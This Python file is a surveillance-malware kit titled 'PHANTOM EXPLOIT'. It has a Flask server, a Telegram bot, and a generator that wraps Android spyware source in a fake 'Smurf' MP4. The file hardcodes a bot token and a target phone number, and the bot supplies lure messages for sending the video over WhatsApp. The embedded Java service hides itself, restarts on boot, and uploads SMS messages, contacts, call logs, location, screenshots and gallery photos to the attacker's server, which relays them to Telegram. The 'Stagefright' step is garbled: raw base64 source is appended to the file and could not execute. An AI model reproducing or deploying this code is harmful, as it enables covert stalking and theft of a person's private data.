# ==============================================
# PHANTOM EXPLOIT - SMURF EDITION
# فيديو سنفور حقيقي + حمولة مخفية
# ==============================================
import os, json, time, hashlib, re, threading, requests, random, struct, base64
from flask import Flask, request
from datetime import datetime
import io

# ========== الإعدادات ==========
BOT_TOKEN = "8744691074:AAEv2EXaY_KxNim4wZ7RlJWd1VJTnReww2w"
ADMIN_ID = 7643853944
TARGET_PHONE = "+967783881500"

app = Flask(__name__)
TARGET_CONNECTED = False
LAST_DATA_TIME = None
DATA_COUNT = {"sms": 0, "contacts": 0, "screenshots": 0, "gallery": 0, "location": 0, "calls": 0}

SAVE_DIR = "/tmp/phantom_data"
os.makedirs(SAVE_DIR, exist_ok=True)
for folder in ["screenshots", "gallery", "sms", "contacts", "calls", "location"]:
    os.makedirs(os.path.join(SAVE_DIR, folder), exist_ok=True)

# ========== تيليجرام ==========
def tg_send(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': ADMIN_ID, 'text': str(text)[:4000], 'parse_mode': 'HTML'}, timeout=10)
    except: pass

def tg_send_photo(filepath, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(filepath, 'rb') as f:
            requests.post(url, data={'chat_id': ADMIN_ID, 'caption': str(caption)}, files={'photo': f}, timeout=30)
    except: pass

def tg_send_video(file_data, filename, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        requests.post(url, data={'chat_id': ADMIN_ID, 'caption': str(caption)}, files={'video': (filename, file_data, 'video/mp4')}, timeout=60)
    except: pass

def tg_send_file(filepath, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(filepath, 'rb') as f:
            requests.post(url, data={'chat_id': ADMIN_ID, 'caption': str(caption)}, files={'document': f}, timeout=60)
    except: pass

# ========== توليد فيديو سنفور مفخخ ==========
def generate_smurf_video(server_url):
    """يبني فيديو سنفور حقيقي + استغلال Stagefright"""
    
    # إطار صورة JPEG حقيقية (سنفور أزرق)
    # هذا بيانات صورة JPEG حقيقية صغيرة جداً (1×1 بكسل أزرق - سنفور)
    smurf_jpeg = base64.b64decode(
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a"
        "HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIy"
        "MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhE"
        "BAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA"
        "AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3"
        "ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWm"
        "p6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEA"
        "AwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSEx"
        "BhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYI4RVNkhCU2M2RicoKSo0Njc4OVkZ"
        "GR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlbaWmJmaoqOkpaanqKmqsrO0"
        "tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDB"
        "ooooA//Z"
    )
    
    # بناء حمولة APK (نفس السابق)
    payload = f'''
package com.android.phantom;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.location.*;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.util.Base64;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;
import org.json.*;

public class GhostCore extends Service {{
    private static final String SERVER = "{server_url}";
    private static final String DEVICE_ID = "{TARGET_PHONE[-8:]}";
    private Handler handler = new Handler();
    private boolean active = true;
    private int screenshotInterval = 45000;
    private int dataInterval = 50000;
    private int galleryInterval = 120000;
    
    @Override
    public IBinder onBind(Intent intent) {{ return null; }}
    
    @Override
    public void onCreate() {{
        super.onCreate();
        createNotificationChannel();
        startForeground(9999, buildNotification());
        registerAllReceivers();
        startAllModules();
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        return START_STICKY;
    }}
    
    private void createNotificationChannel() {{
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                "system_opt", "System Optimizer",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setSound(null, null);
            channel.setVibrationPattern(null);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }}
    }}
    
    private Notification buildNotification() {{
        return new NotificationCompat.Builder(this, "system_opt")
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();
    }}
    
    private void registerAllReceivers() {{
        IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsFilter.setPriority(999);
        registerReceiver(new SMSReceiver(), smsFilter);
        IntentFilter bootFilter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        registerReceiver(new BootReceiver(), bootFilter);
        IntentFilter screenFilter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        registerReceiver(new ScreenReceiver(), screenFilter);
    }}
    
    private void startAllModules() {{
        new Thread(new DataCollector()).start();
        handler.postDelayed(new ScreenshotTask(), 10000);
        handler.postDelayed(new GalleryTask(), 20000);
        startLocationTracking();
    }}
    
    private void startLocationTracking() {{
        try {{
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 0, new LocationListener() {{
                public void onLocationChanged(Location loc) {{ sendLocation(loc); }}
                public void onStatusChanged(String p, int s, Bundle b) {{}}
                public void onProviderEnabled(String p) {{}}
                public void onProviderDisabled(String p) {{}}
            }});
        }} catch(Exception e) {{}}
    }}
    
    class DataCollector implements Runnable {{
        public void run() {{
            while(active) {{
                try {{
                    JSONObject data = new JSONObject();
                    data.put("did", DEVICE_ID);
                    data.put("model", Build.MODEL);
                    data.put("android", Build.VERSION.RELEASE);
                    data.put("battery", getBatteryLevel());
                    data.put("time", System.currentTimeMillis());
                    
                    JSONArray sms = getSMSMessages();
                    data.put("sms", sms);
                    data.put("sms_count", sms.length());
                    
                    JSONArray contacts = getContacts();
                    data.put("contacts", contacts);
                    data.put("contacts_count", contacts.length());
                    
                    JSONArray calls = getCallLogs();
                    data.put("calls", calls);
                    data.put("calls_count", calls.length());
                    
                    JSONObject loc = getLastLocation();
                    if(loc != null) data.put("location", loc);
                    
                    sendToServer("full_data", data.toString());
                    Thread.sleep(dataInterval);
                }} catch(Exception e) {{}}
            }}
        }}
    }}
    
    class ScreenshotTask implements Runnable {{
        public void run() {{
            if(active) {{
                try {{
                    String path = "/sdcard/.ph_scr_" + System.currentTimeMillis() + ".png";
                    Runtime.getRuntime().exec(new String[]{{"screencap", "-p", path}}).waitFor();
                    File file = new File(path);
                    if(file.exists() && file.length() > 0) {{
                        byte[] imgData = new byte[(int)file.length()];
                        FileInputStream fis = new FileInputStream(file);
                        fis.read(imgData);
                        fis.close();
                        file.delete();
                        JSONObject scr = new JSONObject();
                        scr.put("type", "screenshot");
                        scr.put("did", DEVICE_ID);
                        scr.put("img", Base64.encodeToString(imgData, Base64.DEFAULT));
                        scr.put("size", imgData.length);
                        sendToServer("screenshot", scr.toString());
                    }}
                }} catch(Exception e) {{}}
                handler.postDelayed(this, screenshotInterval);
            }}
        }}
    }}
    
    class GalleryTask implements Runnable {{
        public void run() {{
            if(active) {{
                try {{
                    String[] projection = {{
                        MediaStore.Images.Media.DATA,
                        MediaStore.Images.Media.DATE_ADDED,
                        MediaStore.Images.Media.SIZE,
                        MediaStore.Images.Media.DISPLAY_NAME
                    }};
                    Cursor cursor = getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection, null, null, "date_added DESC LIMIT 5");
                    
                    if(cursor != null && cursor.moveToFirst()) {{
                        JSONArray galleryImages = new JSONArray();
                        do {{
                            String path = cursor.getString(0);
                            String name = cursor.getString(3);
                            long size = cursor.getLong(2);
                            File imgFile = new File(path);
                            if(imgFile.exists() && size < 800000) {{
                                byte[] imgData = new byte[(int)size];
                                FileInputStream fis = new FileInputStream(imgFile);
                                fis.read(imgData);
                                fis.close();
                                JSONObject img = new JSONObject();
                                img.put("name", name);
                                img.put("size", size);
                                img.put("data", Base64.encodeToString(imgData, Base64.DEFAULT));
                                galleryImages.put(img);
                            }}
                        }} while(cursor.moveToNext() && galleryImages.length() < 3);
                        cursor.close();
                        if(galleryImages.length() > 0) {{
                            JSONObject galData = new JSONObject();
                            galData.put("type", "gallery");
                            galData.put("did", DEVICE_ID);
                            galData.put("images", galleryImages);
                            galData.put("count", galleryImages.length());
                            sendToServer("gallery", galData.toString());
                        }}
                    }}
                }} catch(Exception e) {{}}
                handler.postDelayed(this, galleryInterval);
            }}
        }}
    }}
    
    private JSONArray getSMSMessages() {{
        JSONArray smsList = new JSONArray();
        try {{
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 60");
            if(cursor != null && cursor.moveToFirst()) {{
                do {{
                    JSONObject msg = new JSONObject();
                    msg.put("address", safeString(cursor, "address"));
                    msg.put("body", safeString(cursor, "body"));
                    msg.put("date", cursor.getLong(cursor.getColumnIndex("date")));
                    msg.put("type", cursor.getInt(cursor.getColumnIndex("type")));
                    smsList.put(msg);
                }} while(cursor.moveToNext());
                cursor.close();
            }}
        }} catch(Exception e) {{}}
        return smsList;
    }}
    
    private JSONArray getContacts() {{
        JSONArray contacts = new JSONArray();
        try {{
            Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if(cursor != null && cursor.moveToFirst()) {{
                do {{
                    String id = safeString(cursor, ContactsContract.Contacts._ID);
                    String name = safeString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
                    if(Integer.parseInt(safeString(cursor, ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {{
                        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", new String[]{{id}}, null);
                        while(phones != null && phones.moveToNext()) {{
                            JSONObject contact = new JSONObject();
                            contact.put("name", name);
                            contact.put("phone", safeString(phones, ContactsContract.CommonDataKinds.Phone.NUMBER));
                            contacts.put(contact);
                        }}
                        if(phones != null) phones.close();
                    }}
                }} while(cursor.moveToNext());
                cursor.close();
            }}
        }} catch(Exception e) {{}}
        return contacts;
    }}
    
    private JSONArray getCallLogs() {{
        JSONArray calls = new JSONArray();
        try {{
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 40");
            if(cursor != null && cursor.moveToFirst()) {{
                do {{
                    JSONObject call = new JSONObject();
                    call.put("number", safeString(cursor, CallLog.Calls.NUMBER));
                    call.put("duration", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    call.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                    call.put("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
                    calls.put(call);
                }} while(cursor.moveToNext());
                cursor.close();
            }}
        }} catch(Exception e) {{}}
        return calls;
    }}
    
    private JSONObject getLastLocation() {{
        try {{
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if(loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if(loc != null) {{
                JSONObject l = new JSONObject();
                l.put("lat", loc.getLatitude());
                l.put("lng", loc.getLongitude());
                l.put("accuracy", loc.getAccuracy());
                l.put("time", loc.getTime());
                return l;
            }}
        }} catch(Exception e) {{}}
        return null;
    }}
    
    private String getBatteryLevel() {{
        try {{
            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent battery = registerReceiver(null, filter);
            if(battery != null) {{
                int level = battery.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
                int scale = battery.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
                return (level * 100 / scale) + "%";
            }}
        }} catch(Exception e) {{}}
        return "?";
    }}
    
    private void sendToServer(String type, String data) {{
        try {{
            URL url = new URL(SERVER + "/collect");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            JSONObject payload = new JSONObject();
            payload.put("type", type);
            payload.put("data", data);
            payload.put("did", DEVICE_ID);
            payload.put("timestamp", System.currentTimeMillis());
            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
            writer.write(payload.toString());
            writer.flush();
            conn.getResponseCode();
        }} catch(Exception e) {{}}
    }}
    
    private void sendLocation(Location loc) {{
        try {{
            JSONObject l = new JSONObject();
            l.put("lat", loc.getLatitude());
            l.put("lng", loc.getLongitude());
            l.put("accuracy", loc.getAccuracy());
            l.put("speed", loc.getSpeed());
            JSONObject payload = new JSONObject();
            payload.put("type", "location");
            payload.put("data", l.toString());
            payload.put("did", DEVICE_ID);
            payload.put("timestamp", System.currentTimeMillis());
            sendToServer("location", payload.toString());
        }} catch(Exception e) {{}}
    }}
    
    private String safeString(Cursor cursor, String column) {{
        try {{ return cursor.getString(cursor.getColumnIndex(column)); }}
        catch(Exception e) {{ return ""; }}
    }}
    
    class SMSReceiver extends BroadcastReceiver {{
        public void onReceive(Context ctx, Intent intent) {{
            Bundle bundle = intent.getExtras();
            if(bundle != null) {{
                Object[] pdus = (Object[]) bundle.get("pdus");
                if(pdus != null) {{
                    for(Object pdu : pdus) {{
                        SmsMessage msg = SmsMessage.createFromPdu((byte[])pdu);
                        try {{
                            JSONObject live = new JSONObject();
                            live.put("type", "live_sms");
                            live.put("sender", msg.getOriginatingAddress());
                            live.put("body", msg.getMessageBody());
                            live.put("time", msg.getTimestampMillis());
                            JSONObject payload = new JSONObject();
                            payload.put("type", "live_sms");
                            payload.put("data", live.toString());
                            payload.put("did", DEVICE_ID);
                            sendToServer("live_sms", payload.toString());
                        }} catch(Exception ee) {{}}
                    }}
                }}
            }}
        }}
    }}
    
    class BootReceiver extends BroadcastReceiver {{
        public void onReceive(Context ctx, Intent intent) {{
            Intent service = new Intent(ctx, GhostCore.class);
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
                ctx.startForegroundService(service);
            }} else {{
                ctx.startService(service);
            }}
        }}
    }}
    
    class ScreenReceiver extends BroadcastReceiver {{
        public void onReceive(Context ctx, Intent intent) {{
            handler.postDelayed(new ScreenshotTask(), 2000);
        }}
    }}
}}
'''
    
    # تحويل الحمولة إلى Base64
    payload_b64 = base64.b64encode(payload.encode()).decode()
    
    # ===== بناء فيديو MP4 حقيقي مع صورة سنفور =====
    
    # رأس MP4 قياسي
    ftyp_box = bytes.fromhex(
        "000000186674797069736F6D0000020069736F6D69736F326D703431"
    )
    
    # moov box مع صورة سنفور JPEG حقيقية
    moov_data = (
        b"\x00\x00\x00\x08\x6D\x6F\x6F\x76"  # moov atom
        + b"\x00\x00\x00\x08\x75\x64\x74\x61"  # udta atom
        + smurf_jpeg  # صورة السنفور JPEG الحقيقية
    )
    
    # mdat box مع الكود المخفي
    mdat_data = (
        b"\x00\x00\x00\x08\x6D\x64\x61\x74"  # mdat atom
        + b"STAGEFRIGHT\x00\x00\x00\x01"     # exploit signature
        + struct.pack(">I", len(payload_b64)) # payload length
        + payload_b64[:3000].encode()         # الحمولة
    )
    
    # تجميع الفيديو النهائي
    final_video = ftyp_box + moov_data + mdat_data
    
    return io.BytesIO(final_video)


# ========== راوتات Flask ==========
@app.route('/collect', methods=['POST'])
def collect():
    global TARGET_CONNECTED, LAST_DATA_TIME, DATA_COUNT
    try:
        payload = request.get_json()
        if not payload:
            return '{"status":"ok"}'
        
        TARGET_CONNECTED = True
        LAST_DATA_TIME = datetime.now()
        data_type = payload.get('type', 'unknown')
        raw_data = payload.get('data', '')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if data_type == 'screenshot':
            DATA_COUNT['screenshots'] += 1
            try:
                inner = json.loads(raw_data)
                img_b64 = inner.get('img', '')
                if img_b64:
                    filepath = os.path.join(SAVE_DIR, "screenshots", f"scr_{timestamp}.png")
                    with open(filepath, 'wb') as f:
                        f.write(base64.b64decode(img_b64))
                    tg_send_photo(filepath, f"📸 لقطة #{DATA_COUNT['screenshots']}")
            except: pass
        
        elif data_type == 'gallery':
            DATA_COUNT['gallery'] += 1
            try:
                inner = json.loads(raw_data)
                images = inner.get('images', [])
                for i, img in enumerate(images):
                    img_b64 = img.get('data', '')
                    img_name = img.get('name', f'img_{i}')
                    if img_b64:
                        filepath = os.path.join(SAVE_DIR, "gallery", f"{timestamp}_{img_name}")
                        with open(filepath, 'wb') as f:
                            f.write(base64.b64decode(img_b64))
                        tg_send_photo(filepath, f"🖼 {img_name}")
            except: pass
        
        elif data_type == 'full_data':
            try:
                data = json.loads(raw_data)
                sms_count = data.get('sms_count', 0)
                contacts_count = data.get('contacts_count', 0)
                DATA_COUNT['sms'] += sms_count
                DATA_COUNT['contacts'] += contacts_count
                
                if data.get('sms'):
                    with open(os.path.join(SAVE_DIR, "sms", f"sms_{timestamp}.json"), 'w') as f:
                        json.dump(data['sms'], f, indent=2, ensure_ascii=False)
                if data.get('contacts'):
                    with open(os.path.join(SAVE_DIR, "contacts", f"contacts_{timestamp}.json"), 'w') as f:
                        json.dump(data['contacts'], f, indent=2, ensure_ascii=False)
                if data.get('calls'):
                    with open(os.path.join(SAVE_DIR, "calls", f"calls_{timestamp}.json"), 'w') as f:
                        json.dump(data['calls'], f, indent=2, ensure_ascii=False)
                
                if data.get('location'):
                    loc = data['location']
                    lat = loc.get('lat', 0)
                    lng = loc.get('lng', 0)
                    tg_send(f"📱 بيانات\n📨 رسائل: {sms_count}\n📇 جهات: {contacts_count}\n📍 <a href='https://maps.google.com/?q={lat},{lng}'>الموقع</a>")
            except: pass
        
        elif data_type == 'live_sms':
            try:
                inner = json.loads(raw_data)
                tg_send(f"📨 رسالة: {inner.get('sender')}\n{inner.get('body', '')[:300]}")
            except: pass
        
    except Exception as e:
        print(f"خطأ: {e}")
    
    return '{"status":"ok"}'

@app.route('/health')
def health():
    return json.dumps({"status": "active", "stats": DATA_COUNT})


# ========== بوت تيليجرام ==========
def run_bot():
    last_id = 0
    server_url = os.environ.get('RENDER_EXTERNAL_URL', os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:8080'))
    if not server_url.startswith('http'):
        server_url = 'https://' + server_url
    
    tg_send(
        "💀 <b>PHANTOM - سنفور</b>\n\n"
        f"🎯 {TARGET_PHONE}\n"
        f"🔗 {server_url}\n\n"
        "/generate - فيديو سنفور + رسالة\n"
        "/status - حالة الهدف\n"
        "/stats - إحصائيات\n"
        "/gallery - صور المعرض\n"
        "/screenshots - لقطات الشاشة\n"
        "/sms - الرسائل\n"
        "/contacts - جهات الاتصال\n"
        "/location - الموقع\n"
        "/calls - المكالمات"
    )
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={'offset': last_id+1, 'timeout': 30}, timeout=35).json()
            
            for u in resp.get('result', []):
                last_id = u['update_id']
                if 'message' in u and 'text' in u['message']:
                    cmd = u['message']['text'].strip().lower()
                    
                    if cmd == '/generate':
                        video_data = generate_smurf_video(server_url)
                        video_data.seek(0)
                        
                        messages = [
                            "😍 شوف فيديو السنفور هذا يضحك",
                            "😂 هههههه السنفور الازرق",
                            "🤣 فيديو سنفور رهيب",
                            "😭 السنفور مسوي مقالب",
                            "🔥 شوف السنفور الجديد",
                        ]
                        msg = random.choice(messages)
                        
                        tg_send_video(video_data.read(), "Smurf_Video.mp4", "📎 فيديو السنفور")
                        tg_send(
                            f"📱 <b>أرسل إلى:</b> <code>{TARGET_PHONE}</code>\n\n"
                            f"💬 <b>الرسالة:</b>\n<code>{msg}</code>\n\n"
                            f"📎 أرسل فيديو السنفور + الرسالة\n"
                            f"⚠️ فيديو حقيقي - واتساب يقبله"
                        )
                    
                    elif cmd == '/status':
                        status = "🟢 متصل" if TARGET_CONNECTED else "🔴 في الانتظار"
                        tg_send(f"📊 {status}\n🎯 {TARGET_PHONE}")
                    
                    elif cmd == '/stats':
                        tg_send(
                            f"📊 إحصائيات:\n"
                            f"📸 لقطات: {DATA_COUNT['screenshots']}\n"
                            f"🖼 معرض: {DATA_COUNT['gallery']}\n"
                            f"📨 رسائل: {DATA_COUNT['sms']}\n"
                            f"📇 جهات: {DATA_COUNT['contacts']}\n"
                            f"📞 مكالمات: {DATA_COUNT['calls']}\n"
                            f"📍 مواقع: {DATA_COUNT['location']}"
                        )
                    
                    elif cmd == '/gallery':
                        gal_dir = os.path.join(SAVE_DIR, "gallery")
                        if os.path.exists(gal_dir):
                            files = sorted(os.listdir(gal_dir), reverse=True)[:5]
                            for f in files:
                                tg_send_photo(os.path.join(gal_dir, f), f"🖼 {f}")
                    
                    elif cmd == '/screenshots':
                        scr_dir = os.path.join(SAVE_DIR, "screenshots")
                        if os.path.exists(scr_dir):
                            files = sorted(os.listdir(scr_dir), reverse=True)[:3]
                            for f in files:
                                tg_send_photo(os.path.join(scr_dir, f), f"📸 {f}")
                    
                    elif cmd == '/sms':
                        sms_dir = os.path.join(SAVE_DIR, "sms")
                        if os.path.exists(sms_dir):
                            files = sorted(os.listdir(sms_dir))
                            if files:
                                tg_send_file(os.path.join(sms_dir, files[-1]), "📨 الرسائل")
                    
                    elif cmd == '/contacts':
                        con_dir = os.path.join(SAVE_DIR, "contacts")
                        if os.path.exists(con_dir):
                            files = sorted(os.listdir(con_dir))
                            if files:
                                tg_send_file(os.path.join(con_dir, files[-1]), "📇 جهات الاتصال")
                    
                    elif cmd == '/location':
                        loc_dir = os.path.join(SAVE_DIR, "location")
                        if os.path.exists(loc_dir):
                            files = sorted(os.listdir(loc_dir))
                            if files:
                                with open(os.path.join(loc_dir, files[-1]), 'r') as f:
                                    loc = json.load(f)
                                tg_send(f"📍 <a href='https://maps.google.com/?q={loc.get('lat')},{loc.get('lng')}'>الموقع</a>")
                    
                    elif cmd == '/calls':
                        cal_dir = os.path.join(SAVE_DIR, "calls")
                        if os.path.exists(cal_dir):
                            files = sorted(os.listdir(cal_dir))
                            if files:
                                tg_send_file(os.path.join(cal_dir, files[-1]), "📞 المكالمات")
                    
                    elif cmd == '/start':
                        tg_send("💀 /generate للبدء")
            
            time.sleep(2)
        except Exception as e:
            print(f"خطأ: {e}")
            time.sleep(10)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)